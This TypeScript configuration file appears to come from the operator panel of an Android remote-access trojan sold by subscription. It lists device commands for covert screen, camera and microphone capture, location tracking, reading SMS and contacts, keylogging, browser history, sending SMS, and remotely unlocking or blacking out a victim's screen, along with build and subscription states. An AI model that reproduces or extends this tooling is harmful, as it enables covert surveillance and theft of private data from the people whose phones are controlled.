// 集中放枚举映射、状态色票、可选值列表 — 严禁紫/绿/青组合。
// 配色与 src/styles/theme.css 同源（粉 #ff1b6b / 蓝 #0061ff / 橙 #ff930f）。

export const ROLES = ['admin', 'clients', 'news'] as const
export type Role = (typeof ROLES)[number]

export const SUBTYPES = ['1 Month', '3 Month', '6 Month', '9 Month', '12 Month', 'new'] as const
export type Subtype = (typeof SUBTYPES)[number]

export const BUILD_STATES = ['onbuild', 'finished', 'failed'] as const
export type BuildState = (typeof BUILD_STATES)[number]

// Ant Design Vue 标签预设：blue / pink / orange / red / default。
// online 用 blue 而非 green，遵守禁青绿规则。
export const ACCOUNT_STATE_TAG: Record<string, { color: string; label: string }> = {
  active:  { color: 'blue',    label: '活跃' },
  expired: { color: 'orange',  label: '已过期' },
  hidden:  { color: 'default', label: '已隐藏' },
}

export const DEVICE_STATE_TAG: Record<string, { color: string; label: string }> = {
  online:  { color: 'blue',    label: '在线' },
  offline: { color: 'default', label: '离线' },
  frozen:  { color: 'orange',  label: '已禁用' },
}

export const BUILD_STATE_TAG: Record<string, { color: string; label: string }> = {
  finished: { color: 'blue',    label: '完成' },
  onbuild:  { color: 'orange',  label: '构建中' },
  failed:   { color: 'red',     label: '失败' },
}

export const ROLE_TAG: Record<string, { color: string; label: string }> = {
  admin:   { color: 'pink',    label: '管理员' },
  clients: { color: 'blue',    label: '普通用户' },
  news:    { color: 'orange',  label: '新闻' },
}

// 设备控制台可用命令清单（高危项已被后端 WS_BLOCKED_SUBCOMMANDS 拦截）
export const DEVICE_COMMANDS: Array<{ key: string; label: string; group: string }> = [
  { key: 'screen',    label: '屏幕快照',   group: '采集' },
  { key: 'cam',       label: '前置摄像头', group: '采集' },
  { key: 'backcam',   label: '后置摄像头', group: '采集' },
  { key: 'mic',       label: '麦克风',     group: '采集' },
  { key: 'loc',       label: '定位',       group: '采集' },
  { key: 'SMS',       label: '短信列表',   group: '数据' },
  { key: 'Contacts',  label: '通讯录',     group: '数据' },
  { key: 'LOADAPPS',  label: '应用列表',   group: '数据' },
  { key: 'Keylog',    label: '键盘记录',   group: '数据' },
  { key: 'Permissions', label: '权限信息', group: '数据' },
  { key: 'proxy',     label: '代理状态',   group: '数据' },
  { key: 'brows',     label: '浏览器历史', group: '数据' },
  { key: 'bc',        label: '广播刷新',   group: '维护' },
]

// 需要额外参数的指令（ControlPanel 单独处理表单）
export const DEVICE_INPUT_COMMANDS = ['SMSSEND', 'Logdate'] as const
export type DeviceInputCommand = typeof DEVICE_INPUT_COMMANDS[number]

// 屏幕控制指令（subc=screen，携带 comand/lockit/bstate）
export const SCREEN_COMMANDS: Array<{ label: string; comand: string; lockit?: string; bstate?: string }> = [
  { label: '点亮屏幕', comand: 'L',     lockit: '2' },
  { label: '解锁屏幕', comand: 'L',     lockit: '0' },
  { label: '锁定屏幕', comand: 'L',     lockit: '1' },
  { label: '黑屏遮挡', comand: 'block', bstate: '0' },
  { label: '取消黑屏', comand: 'block', bstate: '1' },
]
